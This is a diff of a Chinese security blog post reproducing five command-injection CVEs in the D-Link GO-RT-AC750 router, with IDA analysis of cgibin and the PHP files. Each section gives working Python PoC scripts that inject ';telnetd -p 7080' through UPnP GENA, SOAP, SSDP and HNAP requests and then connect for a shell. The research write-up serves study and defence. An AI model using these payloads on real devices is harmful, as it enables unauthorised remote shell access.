+<p>IDA分析该文件，直接定位到函数<code>genacgi_main</code>处</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015533.png" alt="img"></p>
+<p>上图中在<code>cgibin_main</code>函数中判断是否为<code>gena.cgi</code></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015534.png" alt="img"></p>
+<p><code>genacgi_main</code>函数的功能时：检查HTTP请求方法和判断URI中是否有<code>?service=</code>，若HTTP请求方法为<code>SUBSCRIBE</code>或<code>UNSUBSCRIBE</code>则调用对应的函数处理。当<code>REQUEST_METHOD</code>为<code>SUBSCRIBE</code>时，获取一些环境变量并使用<code>sprintf</code>函数拼接成字符串传入到<code>xmldbc_ephp</code>函数中处理：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015535.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015536.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015537.png" alt="img"></p>
+<p><code>xmldbc_ephp</code>函数将拼接的<code>subscribe_string</code>通过<code>/var/run/xmldb_sock</code>传入到<code>/htdocs/upnp/run.NOTIFY.php</code>文件中进行处理并返回处理结果到服务器。</p>
+<p><code>subscrib_string</code>的内容形式为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">假设传入：SUBSCRIBE URL ?service=service_xx</span><br><span class="line"></span><br><span class="line">/htdocs/upnp/run.NOTIFY.php\nMETHOD=SUBSCRIBE\nINF_UID=SERVER_ID\nSERVICE=service_xx\nSID=HTTP_SID\nTIMEOUT=time_xx\nSHELL_FILE=/var/run/service_xx.sh</span><br></pre></td></tr></table></figure>
+
+<p>查看<code>/htdocs/upnp/run.NOTIFY.php</code>文件内容</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015538.png" alt="img"></p>
+<p>查找文件中涉及到的<code>GENA_subscribe_new</code>函数</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015539.png" alt="img"></p>
+<p>查看<code>gena.php</code>内容</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015540.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015541.png" alt="img"></p>
+<p>综上可知，漏洞点在<code>fwrite(a, $shell_file, &quot;rm -f &quot;.$shell_file.&quot;\n&quot;);</code>代码中的目的是为了执行<code>rm -f shell_file</code>命令删除<code>shell_file</code>文件，但<code>shell_file</code>可通过<code>SUBSCRIBE</code>传入的服务参数进行控制并且全程没有任何对服务参数的检查，从而可实现命令注入。</p>
+<h3 id="4-1-2-POC"><a href="#4-1-2-POC" class="headerlink" title="4.1.2 POC"></a>4.1.2 POC</h3><p>该漏洞涉及到的是UPnP的GENA（通用事件通知结构）相关内容，当设备服务状态发生变化时，会通过event通知控制点。控制点能收到通知的前提是先订阅（SUBSCRIBE）该服务的指定event。订阅特定服务的事件的方法是：发送订阅消息到该服务的事件URL。通过分析可知，此漏洞的触发条件是要路由器发送UPnP订阅服务的请求。根据UPnP官方文档可知订阅请求格式如下：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015542.png" alt="img"></p>
+<p>结合UPnP文档和<code>/var/run/httpd.conf</code>文件内容，可知要构造的subscriber的请求头如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SUBSCRIBE /gena.cgi?service=;telnetd -p 7080 HTTP/1.1</span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">49152</span> </span><br><span class="line">Callback: &lt;http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/&gt;</span><br><span class="line">NT: upnp:event</span><br><span class="line">Timeout: Second-infinite</span><br></pre></td></tr></table></figure>
+
+<p>POC脚本如下，执行后成功getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">request = <span class="string">b&quot;SUBSCRIBE /gena.cgi?service=;telnetd -p 7080 HTTP/1.1\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;Host: 192.168.0.1:49152\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;Callback: &lt;http://192.168.0.1/&gt;\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;NT: upnp:event\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;Timeout: Second-infinite\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.connect((gethostbyname(<span class="string">&quot;192.168.0.1&quot;</span>), <span class="number">49152</span>))</span><br><span class="line">s.send(request)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">system(<span class="string">&#x27;telnet 192.168.0.1 7080&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015543.png" alt="img"></p>
+<h2 id="4-2-CVE-2023-26822"><a href="#4-2-CVE-2023-26822" class="headerlink" title="4.2 CVE-2023-26822"></a>4.2 CVE-2023-26822</h2><h3 id="4-2-1-漏洞分析"><a href="#4-2-1-漏洞分析" class="headerlink" title="4.2.1 漏洞分析"></a>4.2.1 漏洞分析</h3><p>查找漏洞详情</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015544.png" alt="img"></p>
+<p>根据漏洞披露的信息可知漏洞点和<code>service参数</code>以及<code>soapcgi_main</code>有关，在文件系统中查找<code>soapcgi_main</code>并定位到所在文件<code>cgibin</code>，将其拿到IDA中逆向分析，通过函数名查找，定位到<code>soapcgi_main</code>函数，调用该函数的代码如下：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015545.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015546.png" alt="img"></p>
+<p><code>soapcgi_main</code>中关键代码如下：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015547.png" alt="img"></p>
+<p>这段代码是在获取与请求相关的环境变量，可获得的信息有：</p>
+<ul>
+<li>REQUEST_METHOD：POST</li>
+<li>CONTEXT_TYPE：text/xml</li>
+<li>REQUEST_URI：含?service=</li>
+<li>HTTP_SOAPACTION：含有””，且””中含有#</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015548.png" alt="img"></p>
+<p>综上分析可知，漏洞出现的原因是POST的URI中<code>?service=</code>后面的内容可由输入控制，全程没有对该输入进行检查，直接<code>sprintf</code>后由<code>system</code>函数执行。</p>
+<h3 id="4-2-2-POC"><a href="#4-2-2-POC" class="headerlink" title="4.2.2 POC"></a>4.2.2 POC</h3><p>此漏洞涉及到的是UPnP的SOAP（简单对象访问协议）相关内容，SOAP主要是用于保证UPnP设备具有互操作能力。控制点可以调用UPnP设备上的服务，并接收返回结果。根据UPnP官方文档，要调用UPnP设备上的服务，控制点必须以POST方法发送以下格式的请求：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015549.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015550.png" alt="img"></p>
+<p>由上面的分析可知要构造的POST请求头如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /soap.cgi?service=;telnetd -p 7080 HTTP/1.1 </span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">49152</span></span><br><span class="line">Content-Length: <span class="number">100</span></span><br><span class="line">Content-<span class="type">Type</span>: text/xml </span><br><span class="line">SOAPAction: <span class="string">&quot;urn:schemas-upnp-org:service:serviceType:v#actionName&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>POC脚本如下，执行后成功getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">request = <span class="string">b&quot;POST /soap.cgi?service=;telnetd -p 7080 HTTP/1.1\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;Host: 192.168.0.1:49152\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;Content-Type: text/xml\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;Content-Length: 100\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;SOAPAction: \&quot;urn:schemas-upnp-org:service:serviceType:v#actionName\&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.connect((gethostbyname(<span class="string">&quot;192.168.0.1&quot;</span>), <span class="number">49152</span>))</span><br><span class="line">s.send(request)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">system(<span class="string">&#x27;telnet 192.168.0.1 7080&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015551.png" alt="img"></p>
+<h2 id="4-3-CVE-2022-37057"><a href="#4-3-CVE-2022-37057" class="headerlink" title="4.3 CVE-2022-37057"></a>4.3 CVE-2022-37057</h2><h3 id="4-3-1-漏洞分析"><a href="#4-3-1-漏洞分析" class="headerlink" title="4.3.1 漏洞分析"></a>4.3.1 漏洞分析</h3><p>查找漏洞详情</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015552.png" alt="img"></p>
+<p>根据漏洞披露的信息可知与<code>ssdpcgi_main</code>函数以及<code>cgibin</code>文件有关，IDA分析该文件，直接搜索<code>ssdpcgi_main</code>函数，调用该函数的代码为：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015553.png" alt="img"></p>
+<p>根据前面分析的漏洞可知，这次漏洞请求URL中的文件是<code>ssdpcgi</code>。<code>ssdpcgi_main</code>函数中漏洞点关键代码如下：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015554.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015555.png" alt="img"></p>
+<p>根据上图代码可知，实现命令注入需要的环境变量如下：</p>
+<ul>
+<li>HTTP_ST：uuid；</li>
+<li>REMOTE_ADDR</li>
+<li>REMOTE_PORT</li>
+<li>SERVER_ID</li>
+</ul>
+<p>这些数据被传入<code>lxmldbc_system</code>函数，在该函数中直接拼接执行，没有任何检查。这几个环境变量中只有<code>HTTP_ST</code>是需要请求头设定的，即<code>HTTP_ST</code>是可控制的输入，因此<code>HTTP_ST</code>的值即为漏洞点。</p>
+<h3 id="4-3-2-POC"><a href="#4-3-2-POC" class="headerlink" title="4.3.2 POC"></a>4.3.2 POC</h3><p>此漏洞涉及到的是UPnP的SSDP（简单服务发现协议）相关内容，该协议主要是用于发现网络中的UPnP设备。控制点（用户操作的HTTP客户端）可通过使用简单服务发现协议，根据自己的需要在网络中查询能够提供特定服务的设备。相应的设备（也就是该路由器）向控制点发出回应，声明自己的存在及能提供的服务。该协议在HTTP之下使用的是UDP。控制点需要用以下格式发送请求：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015556.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015557.png" alt="img"></p>
+<p>综上分析，结合UPnP文档和<code>/var/run/httpd.conf</code>文件内容可知，构造的请求如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/<span class="number">1.1</span> </span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1900</span></span><br><span class="line">ST: uuid:<span class="number">12345</span>;telnetd -p <span class="number">7080</span></span><br></pre></td></tr></table></figure>
+
+<p>POC脚本如下，执行后成功getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">request = <span class="string">b&quot;M-SEARCH * HTTP/1.1\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;Host: 192.168.0.1:1900\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;ST: uuid:12345;telnetd -p 7080\r\n\r\n&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Set up UDP socket</span></span><br><span class="line">s = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)</span><br><span class="line">s.sendto(request, (<span class="string">&quot;192.168.0.1&quot;</span>, <span class="number">1900</span>))</span><br><span class="line">s.close()</span><br><span class="line"> </span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">system(<span class="string">&#x27;telnet 192.168.0.1 7080&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015558.png" alt="img"></p>
+<h2 id="4-4-CVE-2022-37056"><a href="#4-4-CVE-2022-37056" class="headerlink" title="4.4 CVE-2022-37056"></a>4.4 CVE-2022-37056</h2><h3 id="4-4-1-漏洞分析"><a href="#4-4-1-漏洞分析" class="headerlink" title="4.4.1 漏洞分析"></a>4.4.1 漏洞分析</h3><p>查看漏洞详情</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015559.png" alt="img"></p>
+<p>根据漏洞披露信息可知，和<code>hnap_main</code>函数以及<code>cgibin</code>文件有关，IDA分析<code>cgibin</code>文件，直接搜索<code>hnap_main</code>函数，调用该函数的代码为：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015560.png" alt="img"></p>
+<p><code>hnap_main</code>函数中关键代码如下：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015561.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015562.png" alt="img"></p>
+<p>代码中没有对<code>HTTP_SOAPACTION</code>的值进行检查，直接将其内容中<code>&quot;/&quot;</code>后的内容拼接到<code>buffer</code>中执行。要想<code>HTTP_SOAPACTION</code>的值被作为注入点执行，请求方式不能为<code>POST</code>，可设定为<code>GET</code>，URL为<code>/HNAP1/</code>。</p>
+<h3 id="4-4-2-POC"><a href="#4-4-2-POC" class="headerlink" title="4.4.2 POC"></a>4.4.2 POC</h3><p>POC构造如下，执行后成功getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">request = <span class="string">b&quot;GET /HNAP1/ HTTP/1.1\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;Host: 192.168.0.1\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;SOAPAction: \&quot;http://purenetworks.com/HNAP1/GetDeviceSettings/;telnetd -p 7080;\&quot;\r\n\r\n&quot;</span></span><br><span class="line"> </span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.connect((gethostbyname(<span class="string">&quot;192.168.0.1&quot;</span>), <span class="number">80</span>))</span><br><span class="line">s.send(request)</span><br><span class="line"> </span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">system(<span class="string">&#x27;telnet 192.168.0.1 7080&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015563.png" alt="img"></p>
+<h2 id="4-5-CVE-2022-36523"><a href="#4-5-CVE-2022-36523" class="headerlink" title="4.5 CVE-2022-36523"></a>4.5 CVE-2022-36523</h2><h3 id="4-5-1-漏洞分析"><a href="#4-5-1-漏洞分析" class="headerlink" title="4.5.1 漏洞分析"></a>4.5.1 漏洞分析</h3><p>查看漏洞详情</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015564.png" alt="img"></p>
+<p>根据披露的信息，可知此漏洞和<code>/htdocs/upnpinc/gena.php</code>文件有关。查看该文件内容：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015565.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015566.png" alt="img"></p>
+<p>查看漏洞点发现和CVE-2023-34800最终产生漏洞点的位置和原因一样，不做具体分析。</p>
+<h3 id="4-5-2-POC"><a href="#4-5-2-POC" class="headerlink" title="4.5.2 POC"></a>4.5.2 POC</h3><p>直接上POC测试，和CVE-2023-34800的POC一样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">request = <span class="string">b&quot;SUBSCRIBE /gena.cgi?service=;telnetd -p 7080 HTTP/1.1\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;Host: 192.168.0.1:49152\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;Callback: &lt;http://192.168.0.1/&gt;\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;NT: upnp:event\r\n&quot;</span></span><br><span class="line">request += <span class="string">b&quot;Timeout: Second-infinite\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.connect((gethostbyname(<span class="string">&quot;192.168.0.1&quot;</span>), <span class="number">49152</span>))</span><br><span class="line">s.send(request)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">system(<span class="string">&#x27;telnet 192.168.0.1 7080&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015567.png" alt="img"></p>
+<h1 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">D-Link Go-RT-AC750命令注入漏洞复现</span><br><span class="line">https://mp.weixin.qq.com/s/Org5SNM_5uj3mvap_rSpug</span><br><span class="line"></span><br><span class="line">国家漏洞数据库</span><br><span class="line">https://nvd.nist.gov</span><br><span class="line"></span><br><span class="line">Universal Plug <span class="keyword">and</span> Play Device Architecture (upnp.org)</span><br><span class="line">http://www.upnp.org/specs/arch/UPnP-arch-DeviceArchitecture-v1<span class="number">.0</span>.pdf</span><br></pre></td></tr></table></figure>
       
 
 
@@ -327,16 +450,16 @@
     
     <br>
     <strong class="create-time">发布时间：</strong>
-    2022-01-28
+    2023-08-23
     <br>
     <strong class="update-time">最后更新：</strong>
-    2023-02-12
+    2023-09-15
     <br>
     <strong class="article-titles">本文标题：</strong>
-    <a href="https://foxcookie.github.io/2022/01/28/扫雷辅助/" title="扫雷辅助" target="_blank">扫雷辅助</a>
+    <a href="https://foxcookie.github.io/2023/08/23/D-Link_GORTAC750多漏洞复现/" title="D-Link_GORTAC750多漏洞复现" target="_blank">D-Link_GORTAC750多漏洞复现</a>
     <br>
     <strong class="article-url">本文链接：</strong>
-    <a href="https://foxcookie.github.io/2022/01/28/扫雷辅助/" title="扫雷辅助" target="_blank">https://foxcookie.github.io/2022/01/28/扫雷辅助/</a>
+    <a href="https://foxcookie.github.io/2023/08/23/D-Link_GORTAC750多漏洞复现/" title="D-Link_GORTAC750多漏洞复现" target="_blank">https://foxcookie.github.io/2023/08/23/D-Link_GORTAC750多漏洞复现/</a>
     <br>
     <strong class="copyright">版权声明：</strong>
     本博客所有文章除特别声明外，均采用
@@ -363,11 +486,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">扫雷</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">IOT</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">游戏</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
         		</li>
       		
 		</ul>
@@ -423,7 +546,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://foxcookie.github.io/2022/01/28/%E6%89%AB%E9%9B%B7%E8%BE%85%E5%8A%A9/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://foxcookie.github.io/2023/08/23/D-Link_GORTAC750%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -437,18 +560,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2022/06/25/Android-Studio4-x%E7%89%88%E6%9C%AC%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Android Studio4.x版本动态调试
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/01/23/AfkayAs-2/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">AfkayAs.2</div>
+    <a href="/2023/07/19/CVE-2022-4510-Binwalk_RCE/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CVE-2022-4510-Binwalk_RCE</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -475,7 +589,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">1. 介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E6%97%B6%E9%97%B4%E4%BF%AE%E6%94%B9%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">2. 时间修改实现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%97%B6%E9%97%B4%E6%B8%85%E9%9B%B6%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 时间清零实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E6%97%B6%E9%97%B4%E5%81%9C%E6%AD%A2%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 时间停止实现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E4%B8%80%E9%94%AE%E6%89%AB%E9%9B%B7%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">3. 一键扫雷实现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E8%87%AA%E5%8A%A8%E6%A0%87%E6%B3%A8%E5%9C%B0%E9%9B%B7%E5%88%86%E5%B8%83"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 自动标注地雷分布</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E4%B8%80%E9%94%AE%E6%89%AB%E9%9B%B7Get"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 一键扫雷Get</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%9C%80%E7%BB%88%E8%84%9A%E6%9C%AC"><span class="toc-number">4.</span> <span class="toc-text">4. 最终脚本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">5. 参考链接</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">1. 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">2. 环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">3. 背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-CGI%EF%BC%88Common-Gateway-Interface%EF%BC%89%E9%80%9A%E7%94%A8%E7%BD%91%E5%85%B3%E6%8E%A5%E5%8F%A3"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 CGI（Common Gateway Interface）通用网关接口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-UPnP%EF%BC%88Universal-Plug-and-Play%EF%BC%89%E9%80%9A%E7%94%A8%E5%8D%B3%E6%8F%92%E5%8D%B3%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 UPnP（Universal Plug and Play）通用即插即用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">4. 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-CVE-2023-34800"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 CVE-2023-34800</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.1.1.</span> <span class="toc-text">4.1.1 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-2-POC"><span class="toc-number">4.1.2.</span> <span class="toc-text">4.1.2 POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-CVE-2023-26822"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 CVE-2023-26822</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.2.1.</span> <span class="toc-text">4.2.1 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-2-POC"><span class="toc-number">4.2.2.</span> <span class="toc-text">4.2.2 POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-CVE-2022-37057"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 